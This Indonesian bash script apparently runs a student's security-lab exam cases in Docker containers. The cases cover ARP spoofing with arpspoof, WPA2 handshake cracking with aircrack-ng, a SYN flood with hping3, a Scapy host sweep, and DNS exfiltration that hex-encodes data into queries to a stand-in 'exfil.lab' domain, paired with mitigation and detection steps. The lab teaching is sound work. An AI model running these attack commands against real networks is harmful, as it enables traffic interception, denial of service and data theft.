#!/bin/bash
# uts-run.sh — jalankan satu kasus UTS dengan cepat, lalu cetak buktinya.
#
#   ./lab/uts-run.sh 1|2|3|4|5|6|7
#   ./lab/uts-run.sh clean       (bersihkan semua container & network lab)
#
# Semua perintah sudah disesuaikan dengan laptop ini:
#   - memakai `docker-compose` (hubung), bukan plugin `docker compose`
#   - IP/MAC diambil otomatis, tidak perlu diketik manual
#   - OpenSSL memakai `-pass pass:`

set -uo pipefail
REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$REPO_DIR"

NIM=24552011027
HEX=$(echo -n $NIM | xxd -p)
PROJ=k9

hr() { echo; echo "=============================================="; echo "$1"; echo "=============================================="; }

case "${1:-}" in

1)
  hr "KASUS 1 — Docker dan volume"
  docker volume create vol-k9
  docker run --name w-k9 -v vol-k9:/data alpine:3.20 sh -c "echo $NIM > /data/laporan-k9.txt"
  echo "--- hapus container w-k9 ---"; docker rm w-k9
  echo "--- baca lewat container BARU (data harus masih ada) ---"
  docker run --rm -v vol-k9:/data alpine:3.20 cat /data/laporan-k9.txt
  echo "--- attacker -> target ---"
  docker-compose -p $PROJ -f lab/b/b1-compose/docker-compose.yml up -d
  docker-compose -p $PROJ -f lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
  docker-compose -p $PROJ -f lab/b/b1-compose/docker-compose.yml down -v
  ;;

2)
  hr "KASUS 2 — Kriptografi (AES + sertifikat)"
  docker run --rm -v "$PWD":/work uts-openssl sh -c "
    echo isi laporan k9 > laporan-k9.txt &&
    openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 &&
    echo '--- hash plaintext ---' && sha256sum laporan-k9.txt &&
    openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 &&
    echo '--- hash hasil dekripsi (HARUS SAMA) ---' && sha256sum hasil-k9.txt"
  echo "--- sertifikat ---"
  docker run --rm -v "$PWD":/work uts-openssl sh -c "
    openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem \
      -days 30 -subj /CN=k9.uts.local &&
    openssl x509 -in cert-k9.pem -noout -subject -issuer -dates"
  ;;

3)
  hr "KASUS 3 — ARP spoofing"
  docker network create lab-arp-k9 2>/dev/null || echo "(network sudah ada)"
  for n in korban gateway penyerang; do docker rm -f ${n}-k9 2>/dev/null; done
  docker run -d --name korban-k9    --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools >/dev/null
  docker run -d --name gateway-k9   --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools >/dev/null
  docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools >/dev/null
  sleep 3
  # Perhatikan sintaks `index`: nama network mengandung tanda hubung, dan
  # Go template Docker menolak '-' di dalam {{.a.b-nama}}, jadi harus pakai
  # {{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}.
  IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
  IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
  MAC_GW=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
  echo "korban=$IP_KORBAN   gateway=$IP_GW   mac_gateway=$MAC_GW"
  echo
  # Entry ARP baru terbentuk setelah ada trafik. Ping gateway dulu, kalau tidak
  # tabel ARP korban masih kosong dan tidak ada yang bisa dibandingkan.
  echo "--- 0. bikin entry ARP muncul (ping gateway) ---"
  # JANGAN pakai 'ip neigh del' di sini (bug: justru membuat korban menolak
  # ARP reply, jadi langkah 2 selalu gagal). Alih-alih hapus, paksa entry
  # kembali ke MAC gateway asli dengan state REACHABLE, lalu ping. Ini
  # menyamakan titik awal untuk tiap run dan membuat poisoning masuk cepat.
  docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud reachable dev eth0
  docker exec korban-k9 ping -c 2 "$IP_GW" > /dev/null 2>&1
  echo "--- 1. SEBELUM (baseline: MAC gateway BENAR) ---"
  docker exec korban-k9 ip neigh show "$IP_GW"
  echo
  echo "--- 2. SAAT DISERANG (MAC gateway harus berubah jadi milik penyerang) ---"
  docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW" 2>/dev/null \
    || echo "(arpspoof tidak tersedia — lihat catatan di PANDUAN-UTS.md)"
  # Polling: jangan menunggu tetap. Poison bisa masuk dalam 1-11 detik tergantung
  # state entry, jadi cek sampai benar-benar berubah (maks 12 detik).
  for i in $(seq 1 12); do
    sleep 1
    MAC_NOW=$(docker exec korban-k9 ip neigh show "$IP_GW" \
      | sed -n 's/.*lladdr \([0-9a-f:]*\).*/\1/p')
    [ "$MAC_NOW" != "$MAC_GW" ] && break
  done
  docker exec korban-k9 ip neigh show "$IP_GW"
  echo "   mac gateway asli : $MAC_GW"
  echo "   mac penyerang    : $(docker exec penyerang-k9 cat /sys/class/net/eth0/address)"
  echo
  echo "--- 3. SETELAH MITIGASI (static ARP, harus PERMANENT + MAC asli) ---"
  docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
  docker exec korban-k9 ip neigh show "$IP_GW"
  ;;

4)
  hr "KASUS 4 — Analisis handshake WPA2"
  for f in handshake-k9.cap wordlist-k9.txt; do
    [ -f "$f" ] || { echo "!! $f tidak ada di $PWD — letakkan file dari penguji di sini"; }
  done
  [ -f handshake-k9.cap ] && docker run --rm -v "$PWD":/work uts-kali-tools \
    aircrack-ng -w wordlist-k9.txt handshake-k9.cap
  ;;

5)
  hr "KASUS 5 — ICMP dengan Scapy"
  IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9 2>/dev/null) \
    || { echo "!! container korban-k9 belum ada — jalankan kasus 3 dulu"; exit 1; }
  echo "--- 5a. kirim ICMP echo request ---"
  docker run --rm --network lab-arp-k9 -v "$PWD/lab/kasus/k5-scapy:/work" uts-kali-tools \
    python3 /work/kirim_icmp.py "$IP_KORBAN"
  echo
  echo "--- 5b. sweep host di network ini ---"
  # Network Docker di sini subnetnya /16, jadi jangan scan seluruh subnet:
  # 65536 alamat akan menggantung berjam-jam. Ambil daftar IP container yang
  # benar-benar ada di network ini, lalu scan hanya alamat itu.
  SUBNET=$(docker network inspect lab-arp-k9 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
  HOSTS=$(docker network inspect lab-arp-k9 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
          | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
  echo "subnet: $SUBNET"
  echo "host yang discan: $HOSTS"
  docker run --rm --network lab-arp-k9 uts-kali-tools python3 -c "
from scapy.all import ICMP, IP, sr
targets = '$HOSTS'.split(',')
ans, _ = sr(IP(dst=targets)/ICMP(), timeout=3, verbose=False)
print('Host hidup:')
for sent, recv in ans:
    print('   ', recv.src, 'ttl=', recv[IP].ttl, 'type=', recv[ICMP].type)
"
  ;;

6)
  hr "KASUS 6 — SYN flood"
  docker-compose -p $PROJ -f lab/b/b3-syn-flood/docker-compose.yml up -d
  sleep 3
  echo "--- 1. SEBELUM SERANGAN: jumlah SYN_RECV ---"
  docker-compose -p $PROJ -f lab/b/b3-syn-flood/docker-compose.yml exec -T target netstat -ant | grep -c SYN_RECV
  echo "--- 2. SAAT SERANGAN: jumlah SYN_RECV (tunggu 5 detik) ---"
  docker-compose -p $PROJ -f lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
  sleep 5
  docker-compose -p $PROJ -f lab/b/b3-syn-flood/docker-compose.yml exec -T target netstat -ant | grep -c SYN_RECV
  echo
  echo "--- 3. TANGKAP HANDSHAKE (S=SYN, S.=SYN-ACK, .=ACK) ---"
  docker-compose -p $PROJ -f lab/b/b3-syn-flood/docker-compose.yml exec -T attacker sh -c \
    'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target >/dev/null; sleep 10'
  ;;

7)
  hr "KASUS 7 — DNS exfiltration"
  docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml up -d
  sleep 4

  # PENTING: label hex dari NIM 11 digit hanya 22 karakter, sedangkan ambang
  # detektor di analisis_dns.py adalah >30 karakter — jadi NIM saja TIDAK akan
  # terdeteksi sebagai mencurigakan. Itu wajar: exfiltration nyata membawa data
  # besar, bukan satu NIM.
  #
  # CATATAN TEKNIS (bahan jawaban bagus): satu label DNS maksimal 63 karakter.
  # Hex 83 karakter ditolak dig dengan "label too long". Jadi payload dipecah:
  #   (a) NIM saja (22 char, di bawah ambang -> tidak kena)
  #   (b) potongan payload (40 char, di atas ambang DAN <=63 -> kena)
  PAYLOAD="rahasia-nilai-uts-k9"
  HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)

  echo "--- 1. encode jadi hex ---"
  echo "NIM saja   : $NIM"
  echo "  -> hex   : $HEX   (panjang label: $(echo -n $HEX | wc -c))"
  echo "payload    : $PAYLOAD"
  echo "  -> hex   : $HEX_PAYLOAD   (panjang label: $(echo -n $HEX_PAYLOAD | wc -c))"

  echo
  echo "--- 2. kirim kedua payload lewat query DNS ---"
  echo "  query (a) NIM saja (22 char, tidak kena ambang):"
  docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker \
    dig +short "$HEX.k9.exfil.lab" @dns
  echo "  query (b) payload ($(echo -n $HEX_PAYLOAD | wc -c) char, kena ambang):"
  docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker \
    dig +short "$HEX_PAYLOAD.k9.exfil.lab" @dns

  echo
  echo "--- 3. log resolver + deteksi label mencurigakan ---"
  docker-compose -p $PROJ -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
  python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log

  echo
  echo "--- 4. decode kembali ---"
  echo -n "  query (a) NIM     : "; echo "$HEX" | xxd -r -p; echo
  echo -n "  query (b) payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
  ;;

clean)
  hr "BERSIHKAN SEMUA"
  for p in $PROJ; do
    for y in b1-compose b3-syn-flood b4-dns-exfil; do
      docker-compose -p $p -f lab/b/$y/docker-compose.yml down -v 2>/dev/null
    done
  done
  docker rm -f korban-k9 gateway-k9 penyerang-k9 2>/dev/null
  docker network rm lab-arp-k9 2>/dev/null
  docker volume rm vol-k9 2>/dev/null
  rm -f dns-k9.log
  echo "selesai. sisa container:"; docker ps -a --format '  {{.Names}}' | grep -v '^$' || echo "  (kosong)"
  ;;

*)
  echo "usage: $0 {1|2|3|4|5|6|7|clean}"
  exit 1
  ;;
esac

echo
echo "--- selesai. jangan lupa screenshot bagian yang penting ---"
